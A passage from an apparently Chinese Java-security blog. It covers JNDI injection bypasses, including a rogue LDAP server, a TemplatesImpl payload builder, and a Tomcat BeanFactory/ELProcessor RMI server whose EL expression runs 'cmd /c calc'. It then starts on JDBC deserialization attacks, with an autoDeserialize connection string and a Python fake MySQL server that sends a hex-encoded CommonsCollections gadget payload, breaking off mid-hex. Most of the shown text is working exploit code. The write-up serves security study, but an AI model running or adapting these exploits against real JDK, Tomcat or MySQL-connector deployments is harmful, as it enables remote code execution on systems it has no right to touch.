System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的Utils类为创建一个模板类，然后设置其属性，其实还是CC链那一套，为了避免冗杂，另分开写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo2.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Utils</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(obj.getClass().getName());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">creatTemplatesImpl</span><span class="params">(Class payloadClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(payloadClass));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(payloadClass.getName());</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = clazz.toBytecode();</span><br><span class="line">        <span class="comment">// templatesImpl</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;pwn&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecodes&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="其他注意事项"><a href="#其他注意事项" class="headerlink" title="其他注意事项"></a>其他注意事项</h3><p>执行的恶意类模块必须放在 static里面执行，放在main函数里面是执行不了的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>本质上虽然是利用了LDAP，但是实际上却是利用了序列化的数据。</p><p>先看调用链</p><blockquote><p>注：我一开始使用的版本是 8u282，调的时候总感觉有些问题，和师傅们调的不一样，后来换了8u202好点了。虽然8u282也能顺下来，但因为jdk版本升级，底层变动，其实路子还是相对比较复杂了。因为8u282调的时候，一开始不是lookup方法，所以比较难理解。人生建议选择低版本jdk，否则回怀疑人生</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(ObjectInputStream#readObject --&gt; ... --&gt; Runtime.getRuntime.exec(<span class="string">&#x27;calc&#x27;</span>))</span><br><span class="line">deserializeObject:<span class="number">528</span>, Obj (com.sun.jndi.ldap)</span><br><span class="line">decodeObject:<span class="number">239</span>, Obj (com.sun.jndi.ldap)</span><br><span class="line">c_lookup:<span class="number">1051</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">main:<span class="number">8</span>, JNDIClient (JNDI.bypass1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211229143751.png"></p><p>在其中的<code>JAVA_ATTRIBUTES</code>中，我们可以看到其定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String[] JAVA_ATTRIBUTES = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaSerializedData&quot;</span>, <span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;javaFactory&quot;</span>, <span class="string">&quot;javaCodeBase&quot;</span>, <span class="string">&quot;javaReferenceAddress&quot;</span>, <span class="string">&quot;javaClassNames&quot;</span>, <span class="string">&quot;javaRemoteLocation&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><p>这里的<code>var0</code>是LDAP服务器端发送给<code>Attributes</code>(我们可控)，所以我们可以在服务器端把这个属性与恶意的类进行绑定</p><p>在我们构造的LDAPServer中，我们把<code>JAVA_Attributes</code>中的<code>javaSerializeData</code>进行一个绑定。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, getCommonsCollections6());</span><br></pre></td></tr></table></figure><p>然后进行直接进行反序列化。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211229164212.png"></p><h3 id="本地Factory绕过-RMI"><a href="#本地Factory绕过-RMI" class="headerlink" title="本地Factory绕过(RMI)"></a>本地Factory绕过(RMI)</h3><p>&#x3D;&#x3D;稍微有些苛刻&#x3D;&#x3D;</p><p>在 Reference 类中的 factory Class，要求实现 ObjectFactory 接⼝，</p><p>在 “NamingManager#getObjectFactoryFromReference” ⽅法中的逻辑是这样的：</p><ol><li>优先本地加载factory，这就要求factoryClass在 本地的Classpath中</li><li>本地加载不会从codebase中加载，但是由于⾼版本 jdk 默认不信任 codebase，在⼀般情况 下⽆法利⽤</li><li>在加载完 factory 之后会强制类型转换为 javax.naming.spi.ObjectFactory 接⼝类型， 之后调⽤ factory.getObjectInstance() ⽅法</li></ol><p>所以，如果找可以利用的factory就满足以下要求：</p><ul><li>在目标的ClassPath中，且实现了 javax.naming.spi.ObjectFactory 接⼝</li><li>其 getObjectInstance ⽅法可以被利⽤</li></ul><p>这个可⽤的 factory 类为 org.apache.naming.BeanFactory ，位于 tomcat 的依赖包中，此 外，这个 factory 绕过需要搭配 javax.el.ELProcessor 来完成 RCE，依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span><span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span><span class="comment">&lt;!-- 加载ELProcessor时需要 --&gt;</span><span class="tag">&lt;<span class="name">dependency</span>&gt;</span><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span><span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>来到<code>BeanFactory#getObjectInstance</code>方法中，(太长省略)</p><p>这里的代码逻辑比较复杂，简单可以概括为以下几点：</p><ol><li><code>BeanFactory#getObjectInstance</code> 要求传入Referrnce必须为<code>ResourceRef</code>的实例</li><li><code>BeanFactory</code>通过反射创建了一个bean，这个Bean的类名，属性，属性值都来自于<code>Reference</code>，我们可控。</li><li>在注入Bean的属性的时候，会调用对应的setter方法。这个setter方法不一定要是<code>set...</code>，我们通过<code>ResourceRef</code>对象中的<code>forceString</code>，可以把任意的<code>public</code>方法转换为该属性的<code>setter</code>方法。</li><li>这个方法的参数类型必须是<code>String.class</code></li></ol><p>我们可以利用的方法为<code>javax.el.ELProceor#eval</code>方法，可以执行任意EL表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo03;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">StringRefAddr</span> <span class="variable">sr1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;X=eval&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">el</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()\&quot;)&quot;</span>;</span><br><span class="line">        <span class="type">StringRefAddr</span> <span class="variable">sr2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;X&quot;</span>, el);</span><br><span class="line">        ref.add(sr1);</span><br><span class="line">        ref.add(sr2);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Calc&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/Calc&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">对JNDI的一些总结</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JDBC反序列化漏洞</title>
    <link href="https://h0ld1rs.github.io/posts/20008.html"/>
    <id>https://h0ld1rs.github.io/posts/20008.html</id>
    <published>2022-01-25T13:54:53.000Z</published>
    <updated>2022-03-13T16:19:41.321Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JDBC反序列化漏洞"><a href="#JDBC反序列化漏洞" class="headerlink" title="JDBC反序列化漏洞"></a>JDBC反序列化漏洞</h1><p>对于使用<code>java</code>各种组件的项目，如果所使用的组件本身就存在漏洞，那么大部分实在因为在参数传递的时候收到了污染，而今天介绍的这一种，则是相对于在协议层面上的利用。</p><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><blockquote><p>Java数据库连接，（Java Database Connectivity，简称JDBC）是<a href="https://baike.baidu.com/item/Java%E8%AF%AD%E8%A8%80">Java语言</a>中用来规范客户端程序如何来访问数据库的<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3/10418844">应用程序接口</a>，提供了诸如查询和更新数据库中数据的方法</p></blockquote><p>简单来说，你可以理解为 <code>JDBC</code>是封装好的数据库接口，你可以直接使用<code>java</code>调用该组件的接口，他把数据库的协议封装好了，让你无需对协议进行理解即可使用。</p><blockquote><p>封装也是java的特性之一，，，mysql，mssql，oracle…—&gt;JDBC—&gt;Mybatis—-&gt;Mybatis plus</p></blockquote><p>除了JDBC外，还有<code>JNDI(Java Naming and Directory Interface,Java命名和目录接口)(下节课讲)：LDAP,RMI,JRMP</code>，SOAP,  JMS ，JTA ，JWT等等，都是JAVA在开发中常用的协议</p><h2 id="JDBC反序列化漏洞-1"><a href="#JDBC反序列化漏洞-1" class="headerlink" title="JDBC反序列化漏洞"></a>JDBC反序列化漏洞</h2><p>这是2019年黑帽大会的一个议题，详细可以查看</p><p><a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf</a></p><p>该漏洞需要能够控制客户端的JDBC连接字符串，在连接阶段即可触发，无需执行SQL语句</p><p>我们可以编写这样的demo进行测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        System.out.println(conn);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>解释一下JDBC连接时候所使用的几个参数</p><ul><li>autoDeserialize：自动检测与反序列化存在BLOB字段中的对象；</li><li>statementInterceptors：开发在调试sql语句的时候会使用拦截器来进行调试，这里使用ServerStatusDiffInterceptor</li></ul></blockquote><p>其中mysql的版本使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.47<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们贴上师傅写的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d